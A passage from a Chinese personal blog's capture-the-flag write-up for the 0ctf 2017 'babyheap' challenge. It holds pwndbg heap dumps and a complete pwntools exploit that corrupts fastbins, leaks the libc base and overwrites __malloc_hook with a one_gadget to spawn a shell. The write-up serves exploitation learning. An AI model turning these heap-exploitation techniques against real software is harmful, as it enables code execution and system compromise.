0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67aed</span><br><span class="line">0x7f6a86e67aed &lt;_IO_wide_data_0+301&gt;:	0x6a86e66260000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67afd:	0x6a86b28ea0000000	0x6a86b28a7000007f</span><br><span class="line">0x7f6a86e67b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f6a86e67b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b4d &lt;main_arena+45&gt;:	0x6a86e67aed000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x14ee1f61a0000000</span><br><span class="line">0x7f6a86e67b7d &lt;main_arena+93&gt;:	0x14ee1f60f0000056	0x14ee1f60f0000056</span><br><span class="line">0x7f6a86e67b8d &lt;main_arena+109&gt;:	0x14ee1f60f0000056	0x6a86e67b88000056</span><br><span class="line">0x7f6a86e67b9d &lt;main_arena+125&gt;:	0x6a86e67b8800007f	0x6a86e67b9800007f</span><br><span class="line">0x7f6a86e67bad &lt;main_arena+141&gt;:	0x6a86e67b9800007f	0x6a86e67ba800007f</span><br><span class="line">0x7f6a86e67bbd &lt;main_arena+157&gt;:	0x6a86e67ba800007f	0x6a86e67bb800007f</span><br><span class="line">0x7f6a86e67bcd &lt;main_arena+173&gt;:	0x6a86e67bb800007f	0x6a86e67bc800007f</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x00007f6a86b28ea0	0x00007f6a86b28a70</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x00007f6a86ae826a	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
<h4 id="15-申请到假的chunk，修改malloc-hook-gt-gadget"><a href="#15-申请到假的chunk，修改malloc-hook-gt-gadget" class="headerlink" title="15.申请到假的chunk，修改malloc_hook-&gt;gadget"></a>15.申请到假的chunk，修改malloc_hook-&gt;gadget</h4><blockquote>
<p>最后只要执行malloc操作，即可get shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",25261)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>常规的堆题流程，，，经典题目</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Shuwen"
      src="/images/shuwen.jpg">
  <p class="site-author-name" itemprop="name">Shuwen</p>
  <div class="site-description" itemprop="description">做有意思的事，有意思地做事</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">61</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/warm-winter" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;warm-winter" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://kaaass.net/" title="https:&#x2F;&#x2F;kaaass.net&#x2F;" rel="noopener" target="_blank">KAAAsS</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://xuanxuanblingbling.github.io/" title="https:&#x2F;&#x2F;xuanxuanblingbling.github.io&#x2F;" rel="noopener" target="_blank">Clang裁缝店</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shuwen</span>
</div>
	<div class="powered-by">
		<i class="fa fa-user-md"></i>
		<span id="busuanzi_container_site_uv">
		  本站访客数:<span id="busuanzi_value_site_uv"></span>
		</span>
	</div>

  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>


        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
